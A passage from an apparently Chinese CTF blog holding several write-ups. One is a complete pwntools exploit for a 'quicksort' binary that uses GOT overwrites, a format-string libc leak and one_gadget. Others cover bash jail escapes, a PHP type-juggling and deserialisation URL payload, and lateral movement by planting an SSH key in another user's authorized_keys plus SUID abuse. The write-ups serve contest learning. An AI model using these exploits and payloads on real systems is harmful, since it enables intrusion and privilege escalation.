学长提供了一个思路就是改成printf之后直接 format string。最后的思路是把free改成了printf，然后泄漏 libc 上的地址。这里要注意的一点就是atoi返回的值是signed int，如果字符串超过了四个字符，那就会返回0x7fffffff，所以泄漏的时候找了第六个参数，%6$p就不会超过signed int。 10056| 0xff8348f8 --&gt; 0x804a800 --&gt; 0x7fffffff free完之后还需要写one_gadget，所以这里想办法再跳回到func。想要绕过canary肯定是不可能了，所以前面也利用了一次任意写，把__stack_chk_fail改成了func，这样又能跳回来。 最后写one_gadget的时候又遇到了上面signed int的问题，这个无法避免了。想到的一个骚思路是用补码，传一个负数进去，就能写上one_gadget了。 Exploit123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566#!/usr/bin/env pythonfrom pwn import *context.log_level = 'debug'context.arch = 'i386'context.terminal = ['tmux', 'sp', '-h']local = 0if local: p = process('./quicksort') libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote('34.92.96.238', 10000) libc = ELF('./libc.so.6')elf = ELF('./quicksort')g = lambda x: next(elf.search(asm(x)))gets_plt = elf.plt['gets']gets_got = elf.got['gets']puts_plt = elf.plt['puts'] # 0x8048560puts_got = elf.got['puts'] # 0x804a02cfree_got = elf.got['free'] # 0x804a018atoi_got = elf.got['atoi']printf_got = elf.got['printf']printf_plt = elf.plt['printf']func = 0x08048816buf = 0x0804a000 + 0x800 # 0x0804b000 - 0x100stack_chk_fail_got = elf.got['__stack_chk_fail']#gdb.attach(p, '''#b *0x80489aa#''')def write(addr, val, t): payload = str(val) payload += (0x10 - len(payload)) * '\\x00' payload += p32(t) payload += (0x1C - len(payload)) * '\\x00' payload += p32(addr) p.recvuntil('number:') p.sendline(payload)def overflow(addr, val, t): payload = str(val) payload += (0x10 - len(payload)) * '\\x00' payload += p32(t) payload += (0x1C - len(payload)) * '\\x00' payload += p32(addr) + '\\x00' * 4 p.recvuntil('number:') p.sendline(payload)t = 2p.recvuntil('sort?\\n')p.sendline(str(t))write(free_got, printf_plt, 2)write(stack_chk_fail_got, func, 2)fmt = '%6$p'overflow(buf, str(int(fmt[::-1].encode('hex'), 16)), 1)p.recvuntil('0x')libc_base = int(p.recv(8), 16) - 0x1b3864success('libc_base = ' + hex(libc_base))one_gadget = libc_base + 0x3ac62success('one_gadget = ' + hex(one_gadget))one_gadget_complement = -(0x100000000 - one_gadget)success('one_gadget_complement = ' + hex(one_gadget_complement))p.recvuntil('sort?\\n')p.sendline(str(t))overflow(stack_chk_fail_got, one_gadget_complement, 1)p.interactive()","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"qianfei11.coding.me/tags/ctf/"},{"name":"wp","slug":"wp","permalink":"qianfei11.coding.me/tags/wp/"},{"name":"pwn","slug":"pwn","permalink":"qianfei11.coding.me/tags/pwn/"}]},{"title":"Some Linux Category Challenges","slug":"Some-Linux-Category-Challenges","date":"2019-04-15T09:05:27.000Z","updated":"2019-08-26T05:51:07.050Z","comments":true,"path":"2019/04/15/Some-Linux-Category-Challenges/","link":"","permalink":"qianfei11.coding.me/2019/04/15/Some-Linux-Category-Challenges/","excerpt":"在 Byte Bandits CTF 2019 和 WPICTF 2019 中又遇到了 Linux 题，记录记录。","text":"在 Byte Bandits CTF 2019 和 WPICTF 2019 中又遇到了 Linux 题，记录记录。 Byte Bandits CTF 2019bash-fu123456789$ nc 13.234.130.76 7002bash: cannot set terminal process group (1): Not a ttybash: no job control in this shellbash-4.4$ lslsbash: LS: command not foundbash-4.4$ pwdpwdbash: PWD: command not found 显然 bash 是区分大小写的，而后台有一个程序把我们输入的命令改成了大写字母。谷歌一下可以找到shell 如何将 \b 字母进行大小写转换。然后定义一下变量，执行${l,,}就能执行小写的命令了。 12345678910111213141516bash-4.4$ l=\"ls /\"l=\"ls /\"bash-4.4$ $&#123;l,,&#125;$&#123;l,,&#125;bin etc jail media opt root sbin sys usrdev home lib mnt proc run srv tmp varbash-4.4$ l=\"ls /jail/\"l=\"ls /jail/\"bash-4.4$ $&#123;l,,&#125;$&#123;l,,&#125;flag.txt jailbash-4.4$ c=\"cat /jail/flag.txt\"c=\"cat /jail/flag.txt\"bash-4.4$ $&#123;c,,&#125;$&#123;c,,&#125;flag&#123;b@$h_jails_are_3asy_p3@sy&#125; 看一下jail，主要就是把小写字母替换成了大写： 123456789101112131415161718bash-4.4$ cat jailcat jailpreexec () &#123; filtered=$(echo $BASH_COMMAND | tr '[:lower:]' '[:upper:]') eval $filtered&#125;preexec_invoke_exec () &#123; [ -n \"$COMP_LINE\" ] &amp;&amp; return # do nothing if completing [ \"$BASH_COMMAND\" = \"$PROMPT_COMMAND\" ] &amp;&amp; return # don't cause a preexec for $PROMPT_COMMAND [ \"$BASH_COMMAND\" = \"shopt -s extdebug\" ] &amp;&amp; return preexec return 1&#125;shopt -s extdebugset -o noglobtrap 'preexec_invoke_exec' DEBUG &amp;&amp; shopt -s extdebug# vim:ft=sh 还看到另外有一种做法是，用$0： 12345678910111213bash-4.4$ $0$0bash: cannot set terminal process group (1): Not a ttybash: no job control in this shellbash: /root/.bashrc: Permission deniedbash-4.4$ cd /jailcd /jailbash-4.4$ lslsflag.txt jailbash-4.4$ cat flag.txtcat flag.txtflag&#123;b@$h_jails_are_3asy_p3@sy&#125; 测试了一下发现$0表示当前使用的 shell： 12345root@152486b98e3d:~# echo $0/bin/bashroot@152486b98e3d:~# $0root@152486b98e3d:~# exitroot@152486b98e3d:~# WPICTF 2019suckmore-shell1234567891011$ ssh ctf@107.21.60.114ctf@107.21.60.114's password:SuckMORE shell v1.0.1. Note: for POSIX support update to v1.1.0suckmore&gt;lssuckmore&gt;ls -hsleep: invalid option -- 'h'Try 'sleep --help' for more information.suckmore&gt;dirbin boot dev etc home lib lib64 lost+found media mnt opt proc root run sbin srv sys tmp usr varsuckmore&gt;cd homecal: failed to parse timestamp or unknown month name: home ls被alias成了sleep，cd也变成了cal，可以用dir来代替ls。尝试用$0无果： 1234suckmore&gt;$0SuckMORE shell v1.0.1. Note: for POSIX support update to v1.1.0suckmore&gt;shWhy would you ever want to leave suckmore shell? 这里用exec来换 shell： 123456789101112131415suckmore&gt;exec /bin/shsuckmore&gt;lssh: /usr/bin/ls: Permission deniedsuckmore&gt;dirbin boot dev etc home lib lib64 lost+found media mnt opt proc root run sbin srv sys tmp usr varsuckmore&gt;cd homesuckmore&gt;dirctfsuckmore&gt;cd ctfsuckmore&gt;dirflagsuckmore&gt;cat flagsh: /usr/bin/cat: Permission deniedsuckmore&gt;sed '' flagWPI&#123;bash_sucks0194342&#125; pseudo-random1234567891011121314151617181920$ ssh ctf@prand.wpictf.xyzctf@prand.wpictf.xyz's password:sh-4.4$ lsbin boot dev etc home lib lib64 lost+found media mnt opt proc root run sbin srv sys tmp usr varsh-4.4$ cd homesh-4.4$ lsctfsh-4.4$ cd ctfsh-4.4$ lssh-4.4$ ls -a. .. .bash_logout .bash_profile .bashrcsh-4.4$ cd /sh-4.4$ lsbin boot dev etc home lib lib64 lost+found media mnt opt proc root run sbin srv sys tmp usr varsh-4.4$ cd devsh-4.4$ lsconsole core fd full mqueue null ptmx pts random shm stderr stdin stdout tty urandom zerosh-4.4$ file *randomrandom: openssl enc'd data with salted passwordurandom: ASCII text 根据题目的提示，在 dev 目录下找到了一个不寻常的文件。通过openssl解密aes-256-cbc，指定解密文件为random，指定口令存放文件为urandom： 123456sh-4.4$ openssl enc -d -aes-256-cbc -in random -kfile urandom*** WARNING : deprecated key derivation used.Using -iter or -pbkdf2 would be better.Being holy in our church means installing a wholly free operating system--GNU/Linux is a good choice--and not putting any non-free software on your computer. Join the Church of Emacs, and you too can be a saint!And lo, it came to pass, that the neophyte encountered the Beplattered One and humbly posed the question \"Oh great master, is it a sin to use vi?\" And St. IGNUcuis dist thus reply unto him, \"No, my young hacker friend, it is not a sin. It is a penance.\"WPI&#123;@11_Ur_d3v1c3s_r_b3l0ng_2_us&#125; crond123456789101112$ ssh ctf@crond.wpictf.xyzctf@crond.wpictf.xyz's password:sh-4.4$ lsbin boot dev etc home lib lib64 lost+found media mnt opt proc root run sbin srv sys tmp usr varsh-4.4$ cd homesh-4.4$ lsctfsh-4.4$ cd ctfsh-4.4$ lssh-4.4$ ls -a. .. .bash_logout .bash_profile .bashrcsh-4.4$ cd / 找了一圈没什么收获，尝试看看进程下有什么特殊的地方： 1234567891011121314151617181920sh-4.4$ pssh: ps: command not foundsh-4.4$ ls /proc1 acpi cpuinfo execdomains ioports kmsg mdstat net self sysrq-trigger version10 buddyinfo crypto fb irq kpagecgroup meminfo pagetypeinfo slabinfo sysvipc version_signature11 bus devices filesystems kallsyms kpagecount misc partitions softirqs thread-self vmallocinfo320 cgroups diskstats fs kcore kpageflags modules sched_debug stat timer_list vmstat321 cmdline dma interrupts key-users loadavg mounts schedstat swaps tty xen8 consoles driver iomem keys locks mtrr scsi sys uptime zoneinfosh-4.4$ cd procsh-4.4$ for i in `ls */cmdline`; do cat -A $i; echo &apos;&apos;; done/bin/bash^@/bin/init_d^@su^@ctf^@sh^@sleep^@1^@cat: 1482/cmdline: No such file or directory/bin/bash^@/usr/bin/fakecron^@cat^@-A^@self/cmdline^@cat^@-A^@thread-self/cmdline^@ 尝试把每个进程的cmdline读出来，发现了跑着一个叫/usr/bin/fakcron的东西。cron是运用 Linux 所不可缺少的工具，可用来定期的管理获取日志的软件，定期的检查系统状态，可用来监视进程或者其它主机是否正常运行。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778sh-4.4$ sed '' /usr/bin/fakecron#!/bin/bash# Cron. But worse.## Copyright (c) 2019, SuckMore Software, a division of WPI Digital Holdings Ltd.# Redistribution and use in source and binary forms, with or without# modification, are permitted provided that the following conditions are met:# 1. Redistributions of source code must retain the above copyrig# notice, this list of conditions and the following disclaimer.# 2. Redistributions in binary form must reproduce the above copyright# notice, this list of conditions and the following disclaimer in the# documentation and/or other materials provided with the distribution.# 3. All advertising materials mentioning features or use of this software# must display the following acknowledgement:# This product includes software developed by SuckMore Software, a division# of WPI Digital Holdings Ltd.# 4. Neither the name of the SuckMore Software, a division of WPI Digital Holdings# Ltd, nor the names of its contributors may be used to endorse or promote# products derived from this software without specific prior written permission.## THIS SOFTWARE IS PROVIDED BY SuckMore Software, a division of# WPI Digital Holdings Ltd., ''AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES,# INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND# FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL# SuckMore Software, a division of WPI Digital Holdings Ltd.# DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES# (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;# LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND# ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT# (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS# SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.file=\"/etc/deadline\"cron() &#123; second=0 minute=0 hour=0 day=1; month=1; year=2019; while true; do sleep 1; target_second=`cut -d \" \" -f 6 $file` target_minute=`cut -d \" \" -f 5 $file` target_hour=`cut -d \" \" -f 4 $file` target_day=`cut -d \" \" -f 3 $file` target_month=`cut -d \" \" -f 2 $file` target_year=`cut -d \" \" -f 1 $file` if [[ \"$second\" -eq 59 ]]; then minute=$((minute+1)); second=0; elif [[ \"$minute\" -eq 59 ]]; then hour=$((hour+1)); second=0; minute=0; else second=$((second+1)); fi if [[ \"$year\" -eq \"$target_year\" ]] \\ &amp;&amp; [[ \"$month\" -eq \"$target_month\" ]] \\ &amp;&amp; [[ \"$day\" -eq \"$target_day\" ]] \\ &amp;&amp; [[ \"$hour\" -eq \"$target_second\" ]] \\ &amp;&amp; [[ \"$minute\" -eq \"$target_minute\" ]] \\ &amp;&amp; [[ \"$second\" -eq \"$target_hour\" ]]; then # echo \"WPI&#123;&#125;\" &gt; /home/ctf/flag.txt exec_flag fi rm /etc/faketimerc echo \"$year-$month-$day $hour:$minute:$second\" &gt; /etc/faketimerc done&#125;cron &amp; 发现只要在/etc/faketimerc中的时间和/etc/deadline中的值相同的时候，就会在家目录生成 flag： 1234567891011sh-4.4$ cat /etc/faketimerc2019-1-1 0:0:11sh-4.4$ cat /etc/deadline2020 1 1 0 1 0sh-4.4$ echo \"2019 1 1 0 2 0\" &gt; /etc/deadlinesh-4.4$ cat /etc/faketimerc2019-1-1 0:2:51sh-4.4$ ls /home/ctf/flag.txtsh-4.4$ cat /home/ctf/flag.txt\"WPI&#123;L1nUxH@ck3r01a4&#125;\" Referenceshttps://www.cyberciti.biz/faq/linux-unix-shell-programming-converting-lowercase-uppercase/https://dark-lambda.com/2019/04/14/ctf/bytebandits-ctf-2019/bash-fu/https://www.youtube.com/watch?v=RgcchGiTxpkhttps://infosec.rm-it.de/2019/04/15/wpictf-2019-linux-category/https://blog.51cto.com/shjia/1427138https://www.netkiller.cn/cryptography/openssl/index.htmlhttp://man.linuxde.net/opensslhttps://www.cnblogs.com/wang_yb/p/3804200.html","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"qianfei11.coding.me/tags/ctf/"},{"name":"wp","slug":"wp","permalink":"qianfei11.coding.me/tags/wp/"},{"name":"linux","slug":"linux","permalink":"qianfei11.coding.me/tags/linux/"}]},{"title":"2019-b00t2root-CTF","slug":"2019-b00t2root-CTF","date":"2019-03-31T09:47:36.000Z","updated":"2019-08-26T01:17:06.274Z","comments":true,"path":"2019/03/31/2019-b00t2root-CTF/","link":"","permalink":"qianfei11.coding.me/2019/03/31/2019-b00t2root-CTF/","excerpt":"这个比赛有一类 linux 的题，感觉很有意思。","text":"这个比赛有一类 linux 的题，感觉很有意思。 webEasyPhp题目如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465&lt;?phpinclude \"flag.php\";highlight_file(__FILE__);error_reporting(0);$str1 = $_GET['1'];if(isset($_GET['1']))&#123; if($str1 == md5($str1))&#123; echo $flag1; &#125; else&#123; die(); &#125;&#125;else&#123; die();&#125;$str2 = $_GET['2'];$str3 = $_GET['3'];if(isset($_GET['2']) &amp;&amp; isset($_GET['3']))&#123; if($str2 !== $str3)&#123; if(hash('md5', $salt . $str2) == hash('md5', $salt . $str3))&#123; echo $flag2; &#125; else&#123; die(); &#125; &#125; else&#123; die(); &#125;&#125;else&#123; die();&#125;?&gt;&lt;?phpclass Secrets &#123; var $temp; var $flag;&#125;if (isset($_GET['4'])) &#123; $str4 = $_GET['4']; if(get_magic_quotes_gpc())&#123; $str4=stripslashes($str4); &#125; $res = unserialize($str4); if ($res) &#123; $res-&gt;flag=$flag3; if ($res-&gt;flag === $res-&gt;temp) echo $res-&gt;flag; else die(); &#125; else die();&#125;?&gt; 第一个 check 是弱类型比较，第二个 check 是数组 hash 后返回 null，最后一个则是php 反序列化。payload 如下： 1http://3.16.68.122/Easy-php/?1=0e215962017&amp;2[]=a&amp;3[]=b&amp;4=O:7:%22Secrets%22:2:&#123;s:4:%22temp%22;N;s:4:%22flag%22;R:2;&#125; cryptoScatter Me11:3:1;1.25:3:1;1.5:3:1;1.75:3:1;2:3:1;2:2.75:1;2:2.5:1;2:2.25:1;2:2:1;2:1.75:1;2:1.5:1;1:2.25:1;1.25:2.25:1;1.5:2.25:1;1.75:2.25:1;1:1.5:1;1.25:1.5:1;1.5:1.5:1;1.75:1.5:1;3:3:1;3.25:3:1;3.5:3:1;3.75:3:1;4:3:1;4:2.75:1;4:2.5:1;4:2.25:1;4:2:1;4:1.75:1;4:1.5:1;3:1.5:1;3.25:1.5:1;3.5:1.5:1;3.75:1.5:1;3:1.75:1;3:2:1;3:2.25:1;3:2.5:1;3:2.75:1;5:3:1;5.25:3:1;5.5:3:1;5.75:3:1;6:3:1;6:2.75:1;6:2.5:1;6:2.25:1;6:2:1;6:1.75:1;6:1.5:1;5.75:1.5:1;5.5:1.5:1;5.25:1.5:1;5:1.5:1;5:1.75:1;5:2:1;5:2.25:1;5:2.5:1;5:2.75:1;7:3:1;7.25:3:1;7.5:3:1;7.75:3:1;8:3:1;8:2.75:1;8:2.5:1;8:2.25:1;8:2:1;8:1.75:1;8:1.5:1;9:3:1;9.25:3:1;9.5:3:1;9.75:3:1;10:3:1;10:2.75:1;10:2.5:1;10:2.25:1;9.75:2.25:1;9.5:2.25:1;9.25:2.25:1;9:2.25:1;9:2:1;9:1.75:1;9:1.5:1;9.25:1.5:1;9.5:1.5:1;9.75:1.5:1;10:1.5:1;11:3:1;11.25:3:1;11.5:3:1;11.75:3:1;12:3:1;12:2.75:1;12:2.5:1;12:2.25:1;12:2:1;12:1.75:1;12:1.5:1;11.75:1.5:1;11.5:1.5:1;11.25:1.5:1;11:1.5:1;11:1.75:1;11:2:1;11:2.25:1;11:2.5:1;11:2.75:1;11.25:2.25:1;11.5:2.25:1;11.75:2.25:1 仔细观察可以发现其实是一组三维坐标，而且 z 轴都为一，可以当作是二维的。用 python 还原出来： 1234567891011121314#!/usr/bin/env pythonimport numpy as npimport matplotlib.pyplot as pltf = open('scatter.txt', 'rb')cords = f.read().split(';')f.close()x, y, z = [], [], []for i in cords: x.append(float(i.split(':')[0])) y.append(float(i.split(':')[1])) # z.append(float(i.split(':')[2]))plt.scatter(x, y) # , z)plt.show() linuxSteve RogersSteve knows there’s a flag somewhere in plain sight. Login as steve and find it for him. 给了一个 socat 的脚本，连上去以后是一个 docker。看了一下steve家目录下没有什么东西，隐藏文件也是一些没用的像是.bashrc还有.profile之类的文件。可以先试试cat /etc/passwd能不能用，看看服务器上有哪些用户： 123456789101112131415161718192021222324252627steve@d18fb074a417:~$ lssteve@d18fb074a417:~$ cat /etc/passwdroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin_apt:x:100:65534::/nonexistent:/usr/sbin/nologinsystemd-network:x:101:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologinsystemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologinmessagebus:x:103:104::/nonexistent:/usr/sbin/nologinsshd:x:104:65534::/run/sshd:/usr/sbin/nologinsteve:x:1000:1000:,,,:/home/steve:/bin/bashtony:x:1001:0:,,,:/home/tony:/bin/bash 可以看到除了一开始的root，最下面还有steve和tony两个用户，上面还有一个sshd，说明服务器上起了 ssh。这里推荐一个关于Linux 提权基础（Basic Linux Privilege Escalation）的网站，上面提供了很多可以提权的小命令。我们先用ps aux做一个尝试，查看有什么服务正在跑着，以及哪些用户对应着哪些服务： 123456789steve@d18fb074a417:~$ ps auxUSER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMANDroot 1 0.0 0.0 18376 3108 pts/0 Ss 09:52 0:00 bash /tmp/42.shroot 14 0.0 0.0 72296 3408 ? Ss 09:52 0:00 /usr/sbin/sshdroot 16 0.0 0.0 55952 3344 pts/0 S 09:52 0:00 su -l stevesteve 18 0.0 0.0 18508 3444 pts/0 S 09:52 0:00 -susteve 25 0.0 0.0 34400 3028 pts/0 R+ 09:55 0:00 ps auxsteve@d18fb074a417:~$ cat /tmp/42.shcat: /tmp/42.sh: No such file or directory 可以看到一个bash /tmp/42.sh很引人注目，但是试图打开它的时候失败了。再试试ps -ef，man一下看看这两个参数： 123456789... -A Display information about other users&apos; processes, including those without controlling terminals.... -e Identical to -A. -f Display the uid, pid, parent pid, recent CPU usage, process start time, controlling tty, elapsed CPU usage, and the asso- ciated command. If the -u option is also used, display the user name rather then the numeric uid. When -o or -O is used to add to the display following -f, the command field is not truncated as severely as it is in other formats.... 也就是显示uid、pid、ppid等相关信息，然后看看输出： 1234567steve@d18fb074a417:~$ ps -efUID PID PPID C STIME TTY TIME CMDroot 1 0 0 09:52 pts/0 00:00:00 bash /tmp/42.sh b00t2root&#123;Cmd_l1root 14 1 0 09:52 ? 00:00:00 /usr/sbin/sshdroot 16 1 0 09:52 pts/0 00:00:00 su -l stevesteve 18 16 0 09:52 pts/0 00:00:00 -susteve 27 18 0 09:56 pts/0 00:00:00 ps -ef 我们在 pid 为 1 的进程中看到了bash /tmp/42.sh b00t2root{Cmd_l1，不是很完整的一条 flag。本着 linux 下一切皆文件的思想，我们可以在/proc/1/下找到一个文件cmdline，flag 就在里面： 1234567891011121314151617steve@d18fb074a417:~$ ls /proc/1/ls: cannot read symbolic link '/proc/1/cwd': Permission deniedls: cannot read symbolic link '/proc/1/root': Permission deniedls: cannot read symbolic link '/proc/1/exe': Permission deniedattr exe mounts projid_map statusautogroup fd mountstats root syscallauxv fdinfo net sched taskcgroup gid_map ns schedstat timersclear_refs io numa_maps sessionid timerslack_nscmdline limits oom_adj setgroups uid_mapcomm loginuid oom_score smaps wchancoredump_filter map_files oom_score_adj smaps_rollupcpuset maps pagemap stackcwd mem patch_state statenviron mountinfo personality statmsteve@d18fb074a417:~$ cat /proc/1/cmdlinebash/tmp/42.shb00t2root&#123;Cmd_l1n3_fl4g5_4r3_0bv10u5&#125;steve@d18fb074a417:/home/tony$ Tony StankProfessor Hulk requires a flag hidden in tony‘s account to wield the infinity gauntlet. Retrieve it for him by any means necessary. 我们在上一道题目中发现服务器是开了 ssh 的，在这道题会派上很大的用场。我们尝试进到 tony 的家目录： 123456789101112steve@e2797a47d8f5:~$ cd /home/tonysteve@e2797a47d8f5:/home/tony$ ls -latotal 24drwxrwxrwx 1 tony root 4096 Mar 29 15:30 .drwxr-x--x 1 root root 4096 Mar 29 15:30 ..-rw-r--r-- 1 tony root 220 Mar 29 15:30 .bash_logout-rw-r--r-- 1 tony root 3771 Mar 29 15:30 .bashrc---------- 1 tony root 38 Mar 29 15:28 .flag-rw-r--r-- 1 tony root 807 Mar 29 15:30 .profilesteve@e2797a47d8f5:/home/tony$ touch anythingsteve@e2797a47d8f5:/home/tony$ lsanything 看到了一个.flag文件，很有可能就是我们要找的 flag。然而所属用户是 tony，我们需要想办法变成 tony。因为本地是开了 ssh 的，我们可以在 steve 的家目录生成 ssh 密钥和公钥，并将公钥复制到/home/tony/.ssh/authorized_keys中，这样我们如果从本地 ssh 访问 tony 就不需要输入密码了。可以把用户变成 tony： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465steve@e2797a47d8f5:/home/tony$ mkdir .sshsteve@e2797a47d8f5:/home/tony$ ssh-keygenGenerating public/private rsa key pair.Enter file in which to save the key (/home/steve/.ssh/id_rsa):Created directory '/home/steve/.ssh'.Enter passphrase (empty for no passphrase):Enter same passphrase again:Your identification has been saved in /home/steve/.ssh/id_rsa.Your public key has been saved in /home/steve/.ssh/id_rsa.pub.The key fingerprint is:SHA256:Dy7aH7T8rwupoal6mTAT/uFk2kL0ZoMRp5NNAirlxq4 steve@e2797a47d8f5The key's randomart image is:+---[RSA 2048]----+|o . ||.* o ||o % ||oO . ||o.* S ||+= O + = ||E+Xoo o B . || o++ = + + ||.oo.+ o.. ++. |+----[SHA256]-----+steve@e2797a47d8f5:/home/tony$ ls ~/.sshid_rsa id_rsa.pubsteve@e2797a47d8f5:/home/tony$ cat ~/.ssh/id_rsa.pub &gt;.ssh/authorized_keyssteve@e2797a47d8f5:/home/tony/.ssh$ cat .ssh/authorized_keysssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzOsnxC56QPjbS2Glioff2IO/z/eTpRkOPqNv0qxzRvcwIJpOom8GHU6ae7VOs4466EIUbxIO1oK3xV81CrfCOITUcZ0WCYohVUfY1w0MM65ILQ4SGUdhNiVP9dnu8N/RVfIrcs9dc4Wlb+KixmgURhW9bX6F5As+7iHqCiqpsDN4fyq78lC9ci+Rgg9fgVkboSeMIiqaUK/Ww0W7lwe0mGm4UaTc94CSQRdRrnOutDNKFeLXYl46s+V7pHtFrmSaYZoNI09IkllWcaA4WYlXdGD8qHGwpkptCUjgufkl1e2DetLNTeuwtbj4DhY7af1r9+Vdaa089yeGrgAemgyo9 steve@e2797a47d8f5steve@e2797a47d8f5:/home/tony/.ssh$ ssh -i ~/.ssh/id_rsa tony@localhostThe authenticity of host 'localhost (127.0.0.1)' can't be established.ECDSA key fingerprint is SHA256:n6A8y008mc7HfJYLy8Fw7nexXjofQ8J/ZOQmEtk2TX0.Are you sure you want to continue connecting (yes/no)? yesWarning: Permanently added 'localhost' (ECDSA) to the list of known hosts.Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-1032-aws x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantageThis system has been minimized by removing packages and content that arenot required on a system that users do not log into.To restore this content, you can run the 'unminimize' command.The programs included with the Ubuntu system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted byapplicable law.tony@e2797a47d8f5:~$ iduid=1001(tony) gid=0(root) groups=0(root)tony@e2797a47d8f5:~$ ls -altotal 36drwxrwxrwx 1 tony root 4096 Mar 31 11:38 .drwxr-x--x 1 root root 4096 Mar 29 15:30 ..-rw-r--r-- 1 tony root 220 Mar 29 15:30 .bash_logout-rw-r--r-- 1 tony root 3771 Mar 29 15:30 .bashrcdrwx------ 2 tony root 4096 Mar 31 11:38 .cache---------- 1 tony root 38 Mar 29 15:28 .flag-rw-r--r-- 1 tony root 807 Mar 29 15:30 .profiledrwxrwxr-x 2 steve steve 4096 Mar 31 11:37 .ssh-rw-rw-r-- 1 steve steve 0 Mar 31 11:34 anythingtony@e2797a47d8f5:~$ cat .flagcat: .flag: Permission denied 变成 tony 后，发现依然无法查看，因为无论是哪个用户，对.flag文件没有任何权限。我们尝试进行提权： 123456789101112tony@e2797a47d8f5:~$ find / -perm -u=s -type f 2&gt;/dev/null/bin/sed/bin/mount/bin/umount/bin/su/usr/bin/gpasswd/usr/bin/passwd/usr/bin/newgrp/usr/bin/chsh/usr/bin/chfn/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/openssh/ssh-keysign 注：在类 Unix 系统中，/dev/null，或称空设备，是一个特殊的设备文件，它丢弃一切写入其中的数据，读取它则会立即得到一个 EOF。 在程序员行话，尤其是 Unix 行话中，/dev/null 被称为比特桶或者黑洞。 查找到一些我们能够执行并获取更高权限的一些命令，涉及到一些SUID 的知识。 123456steve@d18fb074a417:~$ ls -l /bin/sed-rwxrwx--- 1 root root 109000 Jan 30 2018 /bin/sedsteve@d18fb074a417:~$ /bin/sed-su: /bin/sed: Permission deniedtony@e2797a47d8f5:~$ iduid=1001(tony) gid=0(root) groups=0(root) 我们发现 steve 是无法执行/bin/sed的，然而 tony 在 root 这个用户组中，是可以执行的。了解一下如何通过 sed 查看文件（在上个礼拜的 Securinets 中也有涉及），然后就能拿到 flag： 12tony@e2797a47d8f5:~$ /bin/sed '' .flagb00t2root&#123;1_h0p3_ssh_15_th3_0nly_w4y&#125; GrootWe know Groot’s no more but we can still hear him in the environment. Can you? 根据提示可以知道 flag 基本上是在环境变量里： 123456789101112131415tony@e2797a47d8f5:~$ envLS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;